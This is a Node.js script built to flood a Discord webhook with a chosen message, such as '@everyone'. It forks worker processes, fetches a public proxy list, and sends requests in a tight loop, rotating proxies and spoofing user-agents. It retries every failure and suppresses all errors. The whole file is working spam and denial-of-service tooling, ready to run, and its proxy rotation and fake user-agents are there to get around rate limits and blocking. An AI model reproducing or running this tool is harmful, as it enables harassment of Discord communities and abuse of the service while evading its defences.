const axios = require('axios');
const cluster = require('cluster');
const random_useragent = require('random-useragent');
const path = require('path');
const fs = require('fs');
const HttpsProxyAgent = require('https-proxy-agent');

const time = process.argv[4];
const threads = process.argv[3];
const contents = process.argv[2];
const webhook = process.argv[5];
let timecount = 1;

async function register(proxies) {
  const proxy = proxies[Math.floor(Math.random() * proxies.length)];
  const agent = new HttpsProxyAgent('http://' + proxy);

  try {
    await axios.post(webhook, {
      content: contents
    }, {
      httpsAgent: agent,
      headers: {
        'User-Agent': random_useragent.getRandom()
      }
    });
    
    console.log('Count', timecount, proxy);
    timecount++;
    
    if (timecount === 99999) {
      process.exit(0);
    }
  } catch (error) {
    register(proxies);
  }
}

async function fetchProxyList() {
  try {
    const proxyListUrl = 'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt';
    const response = await axios.get(proxyListUrl);
    const proxyList = response.data.split('\n');

    console.log('Proxy Count:', proxyList.length);

    return proxyList;
  } catch (error) {
    console.error('Failed to fetch proxy list:', error.message);
    return [];
  }
}

function run(proxies) {
  setInterval(() => {
    register(proxies);
  });
}

async function proxyget() {
  const proxies = await fetchProxyList();
  run(proxies);
}

function main() {
  if (process.argv.length !== 6) {
    console.log(`
      Usage: node ${path.basename(__filename)} <contents> <thread> <time> <webhook>
      Usage: node ${path.basename(__filename)} @everyone 1 300 https://discord.com/api/webhooks/xxxxxxxxxxxxxxxxxx
      `);
    process.exit(0);
  } else {
    if (cluster.isMaster) {
      for (let i = 0; i < threads; i++) {
        cluster.fork();
      }
      cluster.on('exit', (worker, code, signal) => {
        console.log(`Threads: ${worker.process.pid} ended`);
      });
    } else {
      proxyget();
      console.log(`Threads: ${process.pid} started`);
    }
  }
}

setTimeout(() => {
  console.log('Send ended.');
  process.exit(0);
}, time * 1000);

process.on('uncaughtException', (err) => {
  // console.log(err);
});
process.on('unhandledRejection', (err) => {
  // console.log(err);
});

main();
